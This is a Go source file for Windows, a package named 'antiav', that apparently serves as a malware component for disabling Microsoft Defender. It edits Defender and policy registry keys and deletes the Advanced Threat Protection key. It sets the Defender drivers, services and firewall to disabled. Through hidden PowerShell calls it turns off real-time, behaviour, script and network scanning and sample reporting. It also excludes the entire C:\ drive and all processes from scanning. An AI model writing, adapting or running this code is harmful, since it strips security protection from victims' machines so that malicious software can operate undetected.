//go:build windows

package antiav

import (
	"os/exec"
	"path/filepath"
	"syscall"

	"golang.org/x/sys/windows/registry"
)

func runPs(cmd string) {
	run := exec.Command("powershell.exe", cmd)
	run.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	_, _ = run.Output()
	return
}

func disableWinDefendRegs() {
	regDefendPath := "SOFTWARE\\Microsoft\\Windows Defender"
	regDefendPolicyPath := "SOFTWARE\\Policies\\Microsoft\\Windows Defender"
	regATPPath := "SOFTWARE\\Policies\\Microsoft\\Windows Advanced Threat Protection"
	openWDKey, _ := registry.OpenKey(registry.LOCAL_MACHINE, regDefendPath, registry.ALL_ACCESS)
	openRTPKey, _ := registry.OpenKey(registry.LOCAL_MACHINE, filepath.Join(regDefendPath, "Real-Time Protection"), registry.ALL_ACCESS)
	openFTKey, _ := registry.OpenKey(registry.LOCAL_MACHINE, filepath.Join(regDefendPath, "Features"), registry.ALL_ACCESS)
	openWDPKey, _ := registry.OpenKey(registry.LOCAL_MACHINE, regDefendPolicyPath, registry.ALL_ACCESS)
	readRTPKey, err := registry.OpenKey(registry.LOCAL_MACHINE, filepath.Join(regDefendPolicyPath, "Real-Time Protection"), registry.ENUMERATE_SUB_KEYS)
	if err == registry.ErrNotExist {
		_, _, _ = registry.CreateKey(openWDPKey, "Real-Time Protection", registry.CREATE_SUB_KEY)
	}
	openRTPPKey, _ := registry.OpenKey(registry.LOCAL_MACHINE, filepath.Join(regDefendPolicyPath, "Real-Time Protection"), registry.ALL_ACCESS)
	openATPKey, err := registry.OpenKey(registry.LOCAL_MACHINE, regATPPath, registry.ALL_ACCESS)
	if err != registry.ErrNotExist {
		_ = registry.DeleteKey(openATPKey, "")
	}

	defer openWDKey.Close()
	defer openRTPKey.Close()
	defer openFTKey.Close()
	defer openWDPKey.Close()
	defer readRTPKey.Close()
	defer openRTPPKey.Close()

	_ = openWDKey.SetDWordValue("DisableAntiSpyware", 1)
	_ = openWDPKey.SetDWordValue("DisableAntiSpyware", 1)
	_ = openFTKey.SetDWordValue("TamperProtection", 4)
	_ = openRTPKey.SetDWordValue("SpyNetReporting", 0)
	_ = openRTPKey.SetDWordValue("SubmitSamplesConsent", 0)
	_ = openRTPPKey.SetDWordValue("DisableBehaviorMonitoring", 1)
	_ = openRTPPKey.SetDWordValue("DisableOnAccessProtection", 1)
	_ = openRTPPKey.SetDWordValue("DisableScanOnRealtimeEnable", 1)
}

func disableDriversServices() {
	regSvcPath := "SYSTEM\\CurrentControlSet\\Services"
	defenderDrvs := []string{
		"mpsdrv",                //Windows Defender Firewall Authorization Driver
		"mpssvc",                //Windows Defender Firewall
		"Sense",                 //Windows Defender Advanced Threat Protection Service
		"WdBoot",                //Microsoft Defender Antivirus Boot Driver
		"WdFilter",              //Microsoft Defender Antivirus Mini-Filter Driver
		"WdNisDrv",              //Microsoft Defender Antivirus Network Inspection System Driver
		"WdNisSvc",              //Microsoft Defender Antivirus Network Inspection Service
		"WinDefend",             //Microsoft Defender Antivirus Service
		"SecurityHealthService", //Windows Security Service
		"wscsvc"}                //Security Center

	for i := range defenderDrvs {
		regCurrentKey := filepath.Join(regSvcPath, defenderDrvs[i])
		openSvcKey, _ := registry.OpenKey(registry.LOCAL_MACHINE, regCurrentKey, registry.ALL_ACCESS)
		_ = openSvcKey.SetDWordValue("Start", 4)
		defer openSvcKey.Close()
	}
}

func disableScanEngine() {
	mpEngines := []string{
		"DisableArchiveScanning",
		"DisableBehaviorMonitoring",
		"DisableCatchupQuickScan",
		"DisableCatchupFullScan",
		"DisableInboundConnectionFiltering",
		"DisableIntrusionPreventionSystem",
		"DisablePrivacyMode",
		"SignatureDisableUpdateOnStartupWithoutEngine",
		"DisableIOAVProtection",
		"DisableRemovableDriveScanning",
		"DisableBlockAtFirstSeen",
		"DisableScanningMappedNetworkDrivesForFullScan",
		"DisableScanningNetworkFiles",
		"DisableScriptScanning",
		"DisableRealtimeMonitoring"}

	mpEngines2 := []string{
		"HighThreatDefaultAction",
		"ModerateThreatDefaultAction",
		"SevereThreatDefaultAction"}

	for i := range mpEngines {
		runPs("Set-MpPreference -" + mpEngines[i] + " $true -ErrorAction SilentlyContinue")
	}
	for i := range mpEngines2 {
		runPs("Set-MpPreference -" + mpEngines2[i] + " 6 -Force -ErrorAction SilentlyContinue")
	}

	runPs("Set-MpPreference -SubmitSamplesConsent 2 -ErrorAction SilentlyContinue")
	runPs("Set-MpPreference -MAPSReporting 0")
}

func addDriveAndProcsExclusion() {
	openExcPathKey, _ := registry.OpenKey(registry.LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths", registry.QUERY_VALUE)
	openExcProcKey, _ := registry.OpenKey(registry.LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Processes", registry.QUERY_VALUE)
	defer openExcPathKey.Close()
	defer openExcProcKey.Close()
	if _, _, err := openExcPathKey.GetIntegerValue("C:\\"); err == registry.ErrNotExist {
		runPs(`Add-MpPreference -ExclusionPath "C:\" -ErrorAction SilentlyContinue`)
	}
	if _, _, err := openExcProcKey.GetIntegerValue("C:\\*"); err == registry.ErrNotExist {
		runPs(`Add-MpPreference -ExclusionProcess "C:\*" -ErrorAction SilentlyContinue`)
	}
}

func DisableWDInitiate() {
	disableWinDefendRegs()
	disableDriversServices()
	disableScanEngine()
	addDriveAndProcsExclusion()
}
